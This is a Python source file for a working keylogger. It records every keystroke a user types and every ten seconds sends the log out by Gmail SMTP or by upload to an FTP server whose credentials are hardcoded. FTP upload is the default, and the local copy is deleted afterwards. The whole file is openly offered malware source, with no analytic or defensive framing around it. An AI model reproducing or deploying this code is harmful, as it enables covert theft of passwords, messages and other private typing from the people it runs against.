import keyboard # for keylogs
import smtplib # for sending emails using SMTP protocol (gmail)
import ftplib
import os

from threading import Timer #Timer is used to make a method run after an interval of time
from datetime import datetime

SEND_REPORT_EVERY = 10
EMAIL_ADDRESS = "email" #replace with your credentials
EMAIL_PASSWORD = "pass"
# FTP server credentials
FTP_HOST = "ftp.dlptest.com"
FTP_USER = "dlpuser"
FTP_PASS = "rNrKYTX9g7z3RgJRmxWuGHbeu"

class Keylogger:
    
    def __init__(self, interval, report_method="ftp"):
        #pass SEND_REPORT_EVERY to interval
        self.interval = interval
        self.report_method = report_method
        #self.log contains the log of all keystrokes within self.interval
        self.log = ""
        #record start and end datetimes
        self.start_dt = datetime.now()
        self.user = os.environ.get('USERNAME')
        

    def callback(self, event):
        #This callback is invoked whenever a keyboard event occurs
        name = event.name 
        
        if name == "space":
            name = " "
        elif name == "shift":
            name = ""
        elif name == "enter":
            name = "[ENTER]\n"
        elif name == "backspace":
            name = ""
            self.log = self.log[:-1]
        elif name == "ctrl":
            name = "[CTRL]"
        self.log += name #whenever a key is pressed the character is appended to the self.log string
        
    def update_filename(self): #report the keylog to a local file
        #construct the filename to be identified by start time and username
        start_dt_str = str(self.start_dt)[:-16].replace(" ", "-").replace(":", "")
        self.filename = f"keylog-{self.user}-{start_dt_str}"
        

    def report_to_file(self):
        #creates a log file in current directory from self.log variable
        with open(f"{self.filename}.txt", "w") as f:
            #write the keylogs to the file
            print(self.log, file=f)
        print(f"[+] Saved {self.filename}.txt")
    
    def ftp(self):
        with open(f"{self.filename}.txt", "w") as f:
            #write the keylogs to the file
            print(self.log, file=f)
        print(f"[+] Saved {self.filename}.txt")

        # connect to the FTP server
        ftp = ftplib.FTP(FTP_HOST, FTP_USER, FTP_PASS)
        # force UTF-8 encoding
        ftp.encoding = "utf-8"
        # local file name you want to upload
        filename = (f"{self.filename}.txt")
        with open(filename, "rb") as file:
            # use FTP's STOR command to upload the file
            ftp.storbinary(f"STOR {filename}", file)
        # list current files & directories
        ftp.dir()
        # quit and close the connection
        ftp.quit()

        #DELETE THE FILE THAT WAS CREATED
        cwd = os.getcwd()
        os.remove(cwd + '\\' + self.filename + '.txt')

    def sendmail(self, email, password, message): #sending the file through email
        #manages connection to the SMTP server
        server = smtplib.SMTP(host="smtp.gmail.com", port=587)
        #connects to the SMTP server as TLS mode (for security)
        server.starttls()
        #login to the email account
        server.login(email,password)
        #send the message
        server.sendmail(email, email, message)
        #terminates the session
        server.quit()

    def report(self):
        """
        This function gets called every 'self.interval'
        It sends keylogs and resets 'self.log variable
        """
        if self.log:
            #if there is something in the log, report it
            self.end_dt = datetime.now()
            #update 'self.filename'
            self.update_filename()
            if self.report_method == "email":
                self.sendmail(EMAIL_ADDRESS, EMAIL_PASSWORD, self.log)
            elif self.report_method == "file":
                self.report_to_file()
            elif self.report_method == "ftp":
                self.ftp()
            
            print(f"[{self.filename}] - {self.log}")
            self.start_dt = datetime.now()
        self.log = ""
        timer = Timer(interval=self.interval, function=self.report)
        #set the thread as daemon (dies when main thread dies)
        timer.daemon = True
        #start the timer
        timer.start()

    def start(self):
        #record the start datetime
        self.start_dt = datetime.now()
        #start the keylogger
        keyboard.on_release(callback=self.callback)
        #start reporting the keylogs
        self.report()
        # block the current thread, wait until CTRL+C is pressed
        keyboard.wait()

if __name__ == "__main__":

    """if you want keylogger to send to your email, uncomment below"""
    #keylogger = Keylogger(interval=SEND_REPORT_EVERY, report_method="email")

    """if you want keylogger to record keylogs to a local file, uncomment below"""
    #keylogger = Keylogger(interval=SEND_REPORT_EVERY, report_method="file")

    """if you want keylogger to send the file to an ftp server, uncomment below."""
    keylogger = Keylogger(interval=SEND_REPORT_EVERY, report_method="ftp")

    keylogger.start()

